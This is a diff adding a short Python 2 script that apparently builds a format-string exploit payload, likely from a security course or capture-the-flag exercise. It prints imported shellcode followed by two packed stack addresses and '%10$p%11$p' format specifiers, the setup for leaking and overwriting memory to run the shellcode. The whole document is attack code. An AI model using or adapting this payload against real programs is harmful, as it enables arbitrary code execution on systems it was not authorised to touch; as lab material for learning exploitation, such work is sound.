@@ -1,0 +1,3 @@
+from shellcode import shellcode
+from struct import pack
+print shellcode + '\x60' + pack("<I",0xbffedf6e) + pack("<I",0xbffedf6c) + "%10$p%11$p"
